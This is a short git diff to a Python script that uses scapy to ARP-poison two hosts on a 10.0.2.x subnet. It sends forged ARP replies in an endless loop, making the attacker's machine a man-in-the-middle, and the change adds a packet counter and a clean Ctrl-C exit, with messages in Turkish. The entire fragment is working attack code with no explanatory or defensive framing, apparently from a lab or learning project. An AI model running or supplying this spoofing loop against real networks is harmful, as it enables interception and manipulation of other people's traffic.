@@ -16,8 +16,13 @@ def arp_poisoning(target_ip,poisoning_ip):
     arp = scapy.ARP(op=2,psrc=poisoning_ip,hwdst=target_mac,pdst=target_ip)
     scapy.send(arp,verbose=False)
 
-while(True):
-    arp_poisoning("10.0.2.1","10.0.2.3")
-    arp_poisoning("10.0.2.3","10.0.2.1")
-    print("paket yollandı..")
-    time.sleep(3)
+sayac = 0
+try:
+    while(True):
+        arp_poisoning("10.0.2.1","10.0.2.3")
+        arp_poisoning("10.0.2.3","10.0.2.1")
+        sayac += 2
+        print("\rpaket yollandı.. ",sayac,end="")
+        time.sleep(3)
+except(KeyboardInterrupt):
+    print("\n\nçıkış yaptınız\n")
